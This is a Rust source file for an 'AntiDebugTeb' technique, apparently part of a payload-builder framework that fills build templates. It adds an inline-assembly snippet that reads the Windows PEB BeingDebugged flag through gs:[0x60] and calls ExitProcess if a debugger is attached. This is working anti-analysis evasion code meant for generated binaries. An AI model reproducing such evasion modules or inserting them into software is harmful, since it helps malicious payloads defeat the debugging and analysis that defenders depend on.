use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct AntiDebugTeb;

impl Technique for AntiDebugTeb {
    fn meta(&self) -> &'static TechniqueMeta { &ANTI_DEBUG_TEB_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        let snippet = r#"fn evasion_anti_debug_teb() {
    let being_debugged: u32;
    unsafe {
        std::arch::asm!(
            "mov {peb}, gs:[0x60]",
            "movzx {bd:e}, byte ptr [{peb} + 0x02]",
            peb = out(reg) _,
            bd  = out(reg) being_debugged,
            options(nostack, preserves_flags),
        );
    }
    if being_debugged != 0 {
        unsafe { winapi::um::processthreadsapi::ExitProcess(0) };
    }
}
evasion_anti_debug_teb();"#;
        ctx.append_replacement("{{SANDBOX}}", snippet.to_string());
        Ok(())
    }
}

pub use super::super::ANTI_DEBUG_TEB_META;
